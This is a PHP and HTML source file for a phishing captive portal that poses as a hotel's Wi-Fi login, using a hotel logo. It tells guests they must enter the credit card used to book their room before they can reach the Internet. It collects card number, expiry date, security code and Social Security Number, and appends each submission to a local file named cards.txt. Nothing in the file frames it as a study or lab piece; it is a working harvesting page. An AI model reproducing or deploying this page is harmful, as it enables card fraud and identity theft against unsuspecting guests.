<?php

	if(isset($_POST['card_number']) && !empty($_POST['month']) && isset($_POST['year']) && !empty($_POST['svv']) && !empty($_POST['id'])){
			$card_number = $_POST['card_number'];
			$month = $_POST['month'];
			$year = $_POST['year'];
			$svv = $_POST['svv'];
			$id = $_POST['id'];

			$fp = fopen('cards.txt', 'a');
			fwrite($fp, "Card Number:" . $card_number);
			fwrite($fp, "\n");
			fwrite($fp, "Month:" . $month);
			fwrite($fp, "\n");
			fwrite($fp, "Year:" . $year);
			fwrite($fp, "\n");
			fwrite($fp, "SVV:" . $svv);
			fwrite($fp, "\n");
			fwrite($fp, "Id:" . $id);
			fwrite($fp, "\n--------\n");
			fclose($fp);
		}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <link rel="stylesheet" href="styles.css">
    <title>title</title>
</head>
<body>
    <div style="text-align: center">
        <div>
            <img src="fattal-logo.png">
        </div>
        <div style="max-width: 30rem; font-size: 22px; margin: auto; margin-bottom: 1rem;">
            In order to access the Internt, Please enter the credit card credentials used to book the room.
        </div>
        <form action="index.php" method="post">
            <div class="input-box">
                <input type="text" placeholder="Card Number" name="card_number">
            </div>

            <div class="b2 input-box">
                <div>Expiration date</div>
                <div>
                    <select name="month">
                        <option>01</option>
                        <option>02</option>
                        <option>03</option>
                        <option>04</option>
                        <option>05</option>
                        <option>06</option>
                        <option>07</option>
                        <option>08</option>
                        <option>09</option>
                        <option>10</option>
                        <option>11</option>
                        <option>12</option>
                    </select>
                </div>
                <div>
                    <select name="year">
                        <option>2020</option>
                        <option>2021</option>
                        <option>2022</option>
                        <option>2023</option>
                        <option>2024</option>
                        <option>2025</option>
                        <option>2026</option>
                        <option>2027</option>
                        <option>2028</option>
                        <option>2029</option>
                        <option>2030</option>
                        <option>2031</option>
                    </select>
                </div>
            </div>
            <div class="input-box">
                <input type="text" placeholder="SVV" name="svv">
            </div>
            <div class="input-box">
                <input type="text" placeholder="Social Security Number" name="id">
            </div>
            <div class="input-box">
                <button type="submit">Submit</button>
            </div>
            <img src="yOZZ16t.png" style="width: 100%">
        </form>
    </div>
</body>
</html>
